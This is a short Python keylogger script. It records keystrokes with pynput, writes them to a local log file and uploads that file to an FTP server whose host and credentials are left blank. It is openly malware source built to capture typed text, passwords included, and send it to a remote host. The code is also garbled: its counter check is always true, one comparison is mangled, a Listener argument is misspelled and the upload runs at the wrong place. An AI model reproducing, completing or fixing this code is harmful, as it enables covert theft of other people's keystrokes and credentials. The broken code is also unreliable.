from ftplib import FTP
import time
import os
from pynput.keyboard import Key, Listener
count = 0
keys = []
host = ''#FTP IP SERVER
user = ''#FTP USERNAME
passwd = ''#FTP PASSWORD 

def upload_FTP():
	with FTP(host,user,passwd,encoding='Latin-1') as ftp:
		print(ftp.getwelcome()) 
		ftp.cwd("/")#Directory Remote
		ftp.storbinary('STOR log.txt', open('log.txt','rb'))
		ftp.dir()

def on_press(key):
	global keys, count
	keys.append(key)
	print("{0} premuto".format(key))
	if count >- 10:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	filelog = 'log.txt'
	with open(filelog, "a") as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
				f.write('\n')
			elif k.find("Key") -- -1:
			  	f.write(k)
			  	time.sleep(10)
upload_FTP()
def on_relase(key):
	if key == Key.esc:
		return False
with Listener(on_press=on_press, on_xrelase=on_relase) as Listener:
	Listener.join()


